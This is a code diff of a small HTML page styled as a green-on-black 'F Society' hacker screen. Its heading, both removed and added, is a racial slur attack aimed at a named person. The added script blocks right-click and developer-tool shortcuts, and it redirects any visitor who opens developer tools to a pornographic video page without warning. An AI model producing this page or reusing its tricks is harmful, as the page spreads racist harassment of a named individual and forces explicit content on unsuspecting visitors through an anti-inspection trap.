@@ -2,12 +2,13 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>F Society Hack</title>
+  <title>F Society</title>
   <style>
     body {
-      background-color: black;
+      margin: 0;
+      background: black;
       color: #00ff00;
-      font-family: "Courier New", Courier, monospace;
+      font-family: 'Courier New', Courier, monospace;
       display: flex;
       justify-content: center;
       align-items: center;
@@ -15,30 +16,67 @@
       overflow: hidden;
     }
 
-    h1 {
-      font-size: 3em;
+    .glitch {
+      font-size: 2.8em;
+      font-weight: bold;
       text-align: center;
+      position: relative;
+      color: #00ff00;
+      animation: typing 3s steps(30, end) forwards, blink 0.7s infinite;
       white-space: nowrap;
       overflow: hidden;
-      border-right: .15em solid #00ff00;
-      width: 0;
-      animation:
-        typing 4s steps(30, end) forwards,
-        blink-caret 0.75s step-end infinite;
+      border-right: 2px solid #00ff00;
     }
 
     @keyframes typing {
-      from { width: 0 }
-      to { width: 100% }
+      from { width: 0; }
+      to { width: 100%; }
     }
 
-    @keyframes blink-caret {
-      from, to { border-color: transparent }
-      50% { border-color: #00ff00 }
+    @keyframes blink {
+      0%, 100% { border-color: transparent; }
+      50% { border-color: #00ff00; }
     }
   </style>
 </head>
 <body>
-  <h1>GET HACKED BY F SOCIETY DUMB NIGGER BABY </h1>
+  <div class="glitch">Despise is a dumb nigger cuck fuck u kid ur a nigger</div>
+
+  <script>
+    // Disable right-click
+    document.addEventListener('contextmenu', event => event.preventDefault());
+
+    // Block common inspect element keys
+    document.addEventListener('keydown', function(e) {
+        if (
+            e.key === "F12" || // F12
+            (e.ctrlKey && e.shiftKey && (e.key === "I" || e.key === "J" || e.key === "C")) || // Ctrl+Shift+I/J/C
+            (e.ctrlKey && e.key === "U") // Ctrl+U
+        ) {
+            e.preventDefault();
+            return false;
+        }
+    });
+
+    // Simulate DisableDevtool behavior (since it's a placeholder)
+    // Real implementation would require an actual DisableDevtool lib
+    (function() {
+      let devtoolsOpen = false;
+
+      const threshold = 160;
+      setInterval(() => {
+        const widthThreshold = window.outerWidth - window.innerWidth > threshold;
+        const heightThreshold = window.outerHeight - window.innerHeight > threshold;
+        if (widthThreshold || heightThreshold) {
+          if (!devtoolsOpen) {
+            devtoolsOpen = true;
+            window.location.href = 'https://www.pornhub.com/view_video.php?viewkey=664222b4e1f52';
+          }
+        } else {
+          devtoolsOpen = false;
+        }
+      }, 500);
+    })();
+  </script>
 </body>
 </html>
